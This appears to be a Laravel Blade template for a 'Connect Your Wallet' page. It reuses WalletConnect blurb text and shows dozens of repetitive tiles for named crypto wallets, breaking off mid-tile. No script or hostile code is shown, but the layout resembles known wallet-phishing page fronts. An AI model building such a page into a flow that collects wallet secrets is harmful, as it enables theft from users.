@extends('layouts.app')

@section('title', 'Connect Your Wallet')

@section('contents')
	<div class="p-3 connect_wrapper">
		<div class="text-center text-white">
			<h1 class="text-left font-bold text-sm md:text-lg mb-4" style="font-weight: 600;">Step 1: Connect Wallet</h1>
			<span class="font-normal px-5">
				Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.

			</span>

			<div id="wallet_container" class="mt-4 bg-white rounded p-0 py-5">
				<section class="p-0 pb-4 grid grid-cols-3">
					<div class=" rounder mx-4" id="trust_wallet" data-wallet-name="trust" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/trust-wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Trust</p>
					</div>
					<div class=" rounder mx-4" id="walletconnect_wallet"  data-wallet-name="wallet connect" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/walletconnect-wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Wallet Connect</p>
					</div>
					<div class=" rounder mx-4" id="atomic_wallet"  data-wallet-name="atomic wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/atomic-wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Atomic</p>
					</div>
					<div class=" rounder mx-4" id="metamask_wallet"  data-wallet-name="metamask wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/metamask.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Metamask</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="rainbow_wallet"  data-wallet-name="rainbow wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/rainbow-wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Rainbow</p>
					</div>
					<div class=" rounder mx-4" id="argent_wallet"  data-wallet-name="argent wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/argent.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Argent</p>
					</div>
					<div class=" rounder mx-4" id="safe_wallet"  data-wallet-name="safe wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/safe-wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Gnosis Safe Multisig</p>
					</div>
					<div class=" rounder mx-4" id="crypto_wallet"  data-wallet-name="crypto wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/crypto-wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Crypto.com | DeFi Wallet</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="pillar_wallet"  data-wallet-name="pillar wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/pillar-wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Pillar</p>
					</div>
					<div class=" rounder mx-4" id="imToken_wallet"  data-wallet-name="imToken Wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/imToken.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">imToken</p>
					</div>
					<div class=" rounder mx-4" id="anchor_wallet"  data-wallet-name="anchor wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/anchor.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Anchor</p>
					</div>
					<div class=" rounder mx-4" id="onto_wallet" data-wallet-name="onto wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/onto.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">ONTO</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="token_pocket" data-wallet-name="token wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/tokenpocket.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">TokenPocket</p>
					</div>
					<div class=" rounder mx-4" id="math_wallet" data-wallet-name="math wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/math-wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Math Wallet</p>
					</div>
					<div class=" rounder mx-4" id="bit_pay" data-wallet-name="bit wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/bitpay.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Bit Pay</p>
					</div>
					<div class=" rounder mx-4" id="maiar_wallet" data-wallet-name="maiar wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/maiar.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Maiar</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="ledgerlive_wallet" data-wallet-name="ledgerlive wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/ledgerlive.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Ledger Live</p>
					</div>
					<div class=" rounder mx-4" id="walleth_wallet" data-wallet-name="walleth wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/walleth.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Walleth</p>
					</div>
					<div class=" rounder mx-4" id="autherum_wallet" data-wallet-name="authereum wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/authereum.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Authereum</p>
					</div>
					<div class=" rounder mx-4" id="huobi_wallet" data-wallet-name="huobi wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/huobi_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Huobi Wallet</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="eidoo_wallet" data-wallet-name="eidoo wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/eidoo_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Eidoo</p>
					</div>
					<div class=" rounder mx-4" id="mykey_wallet" data-wallet-name="mykey wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/mykey_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">My Key</p>
					</div>
					<div class=" rounder mx-4" id="loopring_wallet" data-wallet-name="loopring wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/loopring_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Loopring Wallet</p>
					</div>
					<div class=" rounder mx-4" id="trustvalut_wallet" data-wallet-name="trustvault wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/trustvault_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">TrustVault</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="coin98_wallet" data-wallet-name="coin98 wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/coin98_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Coin 98</p>
					</div>
					<div class=" rounder mx-4" id="cool_wallet" data-wallet-name="cool wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/cool_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">CoolWallet S</p>
					</div>
					<div class=" rounder mx-4" id="alice_wallet" data-wallet-name="alice wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/alice_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Alice</p>
					</div>
					<div class=" rounder mx-4" id="alpha_wallet" data-wallet-name="alpha wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/alpha_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Alpha Wallet</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="dcent_wallet" data-wallet-name="dcent wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/dcent_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">D'Cent Wallet</p>
					</div>
					<div class=" rounder mx-4" id="zelcore_wallet" data-wallet-name="zelcore wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/zelcore_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">ZelCore S</p>
					</div>
					<div class=" rounder mx-4" id="nash_wallet" data-wallet-name="nash wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/nash_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Nash</p>
					</div>
					<div class=" rounder mx-4" id="coinomi_wallet" data-wallet-name="coinomi wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/coinomi_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Coinomi</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="gridplus_wallet" data-wallet-name="gridplus wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/gridplus_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Grid Plus</p>
					</div>
					<div class=" rounder mx-4" id="cybavo_wallet" data-wallet-name="cybavo wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/cybavo_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">CYBAVO Wallet</p>
					</div>
					<div class=" rounder mx-4" id="tokenary_wallet" data-wallet-name="tokenary wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/tokenary_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Tokenary</p>
					</div>
					<div class=" rounder mx-4" id="wazirx_wallet" data-wallet-name="wazirx wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/wazirx_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Wazirx</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="torus_wallet" data-wallet-name="torus wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/torus_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Torus Wallet</p>
					</div>
					<div class=" rounder mx-4" id="spatium_wallet" data-wallet-name="spatium wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/spatium_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Spatium</p>
					</div>
					<div class=" rounder mx-4" id="safepal_wallet" data-wallet-name="safepal wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/safepal_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">SafePal</p>
					</div>
					<div class=" rounder mx-4" id="equal_wallet" data-wallet-name="equal wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/equal_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Equal</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="infinito_wallet" data-wallet-name="infinito wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/infinito_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Infinito</p>
					</div>
					<div class=" rounder mx-4" id="walletio_wallet" data-wallet-name="walletio wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/wallet.io.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Wallet.io</p>
					</div>
					<div class=" rounder mx-4" id="infinity_wallet" data-wallet-name="infinity wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/infinity_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Infinity Wallet</p>
					</div>
					<div class=" rounder mx-4" id="ownbit_wallet" data-wallet-name="ownbit wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/ownbit_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Ownbit</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="easypocket_wallet" data-wallet-name="easypocket wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/easypocket_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">EasyPocket</p>
					</div>
					<div class=" rounder mx-4" id="bridge_wallet" data-wallet-name="bridge wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/bridge_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Bridge Wallet</p>
					</div>
					<div class=" rounder mx-4" id="sparkpoint_wallet" data-wallet-name="sparkpoint wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/sparkpoint_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">SparkPoint</p>
					</div>
					<div class=" rounder mx-4" id="via_Wallet" data-wallet-name="via wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/via_Wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">ViaWallet</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="bitkeep_wallet" data-wallet-name="bitkeep wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/bitkeep_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">BitKeep</p>
					</div>
					<div class=" rounder mx-4" id="vision_wallet" data-wallet-name="vision wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/vision_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Vision</p>
					</div>
					<div class=" rounder mx-4" id="swft_wallet" data-wallet-name="swft wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/swft_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">SWFT Wallet</p>
					</div>
					<div class=" rounder mx-4" id="peakdefi_wallet" data-wallet-name="peakdefi wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/peakdefi_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">PEAKDEFI Wallet</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="cosmosstation_wallet" data-wallet-name="cosmosstation wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/cosmosstation_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Cosmostation</p>
					</div>
					<div class=" rounder mx-4" id="graph_wallet" data-wallet-name="graph wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/graph_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Graph Protocol</p>
					</div>
					<div class=" rounder mx-4" id="kardachain_wallet" data-wallet-name="kardachain wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/kardachain_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">KardiaChain</p>
					</div>
					<div class=" rounder mx-4" id="keplr_wallet" data-wallet-name="keplr wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/keplr_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Keplr</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="harmony_wallet" data-wallet-name="harmony" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/harmony_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Harmony</p>
					</div>
					<div class=" rounder mx-4" id="iconex_wallet" data-wallet-name="iconex wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/iconex_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">ICONex</p>
					</div>
					<div class=" rounder mx-4" id="fetch_wallet" data-wallet-name="fetch wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/fetch_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Fetch</p>
					</div>
					<div class=" rounder mx-4" id="xdc_wallet" data-wallet-name="xdc wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/xdc_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">XDC Wallet</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="unstoppable_wallet" data-wallet-name="unstoppable wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/unstoppable_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Unstoppable Wallet</p>
					</div>
					<div class=" rounder mx-4" id="meetone_wallet" data-wallet-name="meetone wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/meetone_wallet.jpg') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">MEET.ONE</p>
					</div>
					<div class=" rounder mx-4" id="dok_wallet" data-wallet-name="dok wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/dok_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Dok Wallet</p>
					</div>
					<div class=" rounder mx-4" id="at_wallet" data-wallet-name="at wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/atwallet_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">AT.Wallet</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="morix_wallet" data-wallet-name="morix wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/morix_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">MoriX Wallet</p>
					</div>
					<div class=" rounder mx-4" id="midas_wallet" data-wallet-name="midas wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/midas_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
